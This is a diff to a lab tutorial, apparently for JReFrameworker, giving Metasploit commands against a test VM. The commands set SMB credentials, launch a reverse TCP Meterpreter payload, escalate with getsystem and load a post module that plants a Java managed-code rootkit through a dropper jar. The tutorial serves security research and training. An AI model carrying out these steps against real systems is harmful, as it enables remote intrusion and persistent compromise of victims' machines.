@@ -83,9 +83,9 @@ Type `show options` to view the exploit configuration parameters.
 
 Set the remote host to be the IP address of the victim machine by typing `set RHOST 192.168.115.129`.
 
-Set the username to authenticate as by typing `set SMBUser Victim`. Note that you may need to replace `Victim` with the Windows username you used to configure your virtual machine with during setup.
+Set the username to authenticate as by typing `set SMBUser Victim`. Note that you may need to replace *Victim* with the Windows username you used to configure your virtual machine with during setup.
 
-Set the password to authenticate with by typing `set SMBPass badpass`. Again you may need to replace `badpass` with the actual password you used during setup.
+Set the password to authenticate with by typing `set SMBPass badpass`. Again you may need to replace *badpass* with the actual password you used during setup.
 
 Finally let's configure a reverse TCP Meterpreter payload that will execute Meterpreter on the victim machine and connect back to our attacker machine with the active session. Configure the payload by typing `set PAYLOAD windows/meterpreter/reverse_tcp`.
 
@@ -156,6 +156,30 @@ After setting the registry keys, rerun the exploit in Kali. If you are still not
   </center>
 </p>
 
+If you are unfamiliar with Meterpreter some basic operations can be found [here](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/).
+
+When you are done, type `background` to exit and background the Meterpreter session. Then type `back` to exit the exploit configuration menu.
+
 <a name="PostExploitation"></a>
 
 ## Post Exploitation
+
+Now that we have an active Meterpreter session on our victim machine we can use JReFrameworker to manipulate the runtime or install a managed code rootkit. First determine the active Meterpreter sessions that you have by typing `sessions -l` to list the current sessions.
+
+Since most typical Java runtime installations are installed in a directory that requires root or Administrator privileges you may need to escalate your privileges depending on your current access level.  To begin interacting with the session of the victim machine, type `sessions -i 1` (replacing 1 with your desired session). Type `getsystem` to attempt standard privilege escalation techniques.
+
+Once you have system level privileges (assuming you need them), type `background` to exit and background the Meterpreter session.
+
+Next download a copy of the current [jreframeworker.rb](https://github.com/JReFrameworker/JReFrameworker/blob/master/metasploit/jreframeworker.rb) Metasploit module. Then run `mkdir -p ~/.msf4/modules/post/manage/java` to create a directory path for the custom module. Add the *jreframeworker.rb* module to the newly created directory. Note that the module must end with the Ruby *.rb* extension. Additional information on loading custom Metasploit modules can be found on the [Metasploit Wiki](https://github.com/rapid7/metasploit-framework/wiki/Loading-External-Modules).
+
+At the root Metasploit console type `reload_all` to detect the newly added module.
+
+Load the JReFrameworker post module by typing `use post/manage/java/jreframeworker`. Note that the module path may be different if you decided to change the directory path in the previous step.
+
+Type `show options` to view the basic JReFrameworker module options. Type `show advanced options` to show additional module options.
+
+Type `set PAYLOAD_DROPPER /root/Desktop/hello-world-dropper.jar` to set the JReFrameworker payload to the *hello-world-dropper.jar* module we exported from JReFrameworker earlier.
+
+Type `set SESSION 1` to set the post module to run on the Meterpreter session 1. Note that your session number may be different. Use `sessions -l` to list the current sessions.
+
+Type `run` to execute the post module.
